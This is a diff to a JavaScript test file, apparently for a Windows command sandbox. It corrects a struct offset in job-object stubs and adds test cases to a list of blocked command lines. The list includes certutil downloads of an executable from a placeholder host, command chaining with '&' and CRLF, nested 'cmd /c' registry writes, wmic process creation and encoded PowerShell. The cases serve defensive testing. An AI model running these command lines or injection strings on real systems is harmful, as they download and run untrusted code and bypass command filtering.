@@ -141,9 +141,9 @@ function makeStubs(options = {}) {
       record.setInfo.push({ job, cls, len, buffer: Buffer.from(info) })
       const flags = info.readUInt32LE(16)
       if (flags & 0x8) {
-        record.activeProcessLimits.push(info.readUInt32LE(36))
+        record.activeProcessLimits.push(info.readUInt32LE(40))
         jobMembers.set(job, 0)
-        lowLevel.__activeLimit = info.readUInt32LE(36)
+        lowLevel.__activeLimit = info.readUInt32LE(40)
       }
       return 1
     },
@@ -1349,6 +1349,8 @@ async function main() {
       ['cmd', ['/c', 'echo a\r\nreg add HKCU\\X /v v /d 1'], 'CRLF 链'],
       ['cmd', ['/c', 'cmd', '/c', 'reg', 'add', 'HKCU\\X', '/v', 'v', '/d', '1'], 'cmd /c 嵌套'],
       ['certutil', ['-urlcache', '-f', 'http://x/a.exe', 'C:\\tmp\\a.exe'], 'certutil'],
+      ['echo', ['ok & cmd /c certutil -urlcache -f http://x/a.exe C:\\tmp\\a.exe'], '字面 cmd /c 载荷'],
+      ['echo', ['ok & cmd /d /c certutil -urlcache -f http://x/a.exe C:\\tmp\\a.exe'], '字面 cmd /d /c 载荷'],
       ['wmic', ['process', 'call', 'create', 'calc'], 'wmic'],
       ['powershell', ['-EncodedCommand', 'SQBFAFgA'], '-EncodedCommand'],
     ]) {
